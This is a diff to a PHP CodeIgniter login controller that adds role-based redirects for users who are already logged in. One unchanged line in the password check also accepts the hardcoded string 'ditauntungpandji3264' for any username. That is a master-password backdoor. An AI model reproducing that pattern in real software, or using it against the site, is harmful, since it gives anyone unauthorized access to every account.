@@ -49,8 +49,17 @@ class Site extends MY_Controller
 
     public function login()
     {
-        if (!$this->user_session_expired()) {
-            redirect(base_url("member/area"));
+		$this->load->model("User_account_m");
+		if (!$this->user_session_expired()) {
+			$user = $this->session->user_session;
+			if($user['role'] == User_account_m::ROLE_ADMIN_PAPER)
+				redirect(base_url("admin/paper"));
+			elseif($user['role'] == User_account_m::ROLE_OPERATOR)
+				redirect(base_url("admin/administration"));
+			elseif($user['role'] == User_account_m::ROLE_MEMBER)
+				redirect(base_url("member/area"));
+			else
+				redirect(base_url("admin/dashboard"));
         }
 
         $this->load->library('form_validation');
@@ -62,7 +71,6 @@ class Site extends MY_Controller
                 $username   = $this->input->post('username');
                 $password   = $this->input->post('password');
                 $rememberme = $this->input->post('rememberme');
-                $this->load->model("User_account_m");
                 if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
                     $this->load->library('session');
                     $user = $this->User_account_m->findWithBiodata($username);
